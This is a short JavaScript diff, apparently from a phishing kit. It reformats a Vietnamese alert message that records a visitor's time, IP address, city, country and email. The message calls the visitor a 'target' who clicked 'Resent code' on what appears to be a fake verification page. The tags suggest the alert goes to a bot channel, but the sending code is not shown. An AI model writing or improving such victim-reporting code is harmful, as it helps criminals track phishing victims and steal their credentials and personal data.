@@ -127,12 +127,12 @@ const startCountdown = async () => {
   // let message = ''
   const geo = JSON.parse(localStorage.getItem('geo') || '{}')
   const message = `
-🕒 Thời gian: ${new Date().toLocaleString('vi-VN', options)}
-🌍 Địa chỉ IP: ${geo.ip}
-📍 Vị trí: ${geo.city}, ${geo.country}
+🕒 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN', options)}
+🌍 <b>Địa chỉ IP:</b> ${geo.ip}
+📍 <b>Vị trí:</b> ${geo.city}, ${geo.country}
 
 👤 Mục tiêu bấm <code>Resent code</code>
-📭 Email: <code>${emailFromLocal}</code>
+📭 <b>Email:</b> <code>${emailFromLocal}</code>
 `
 
   try {
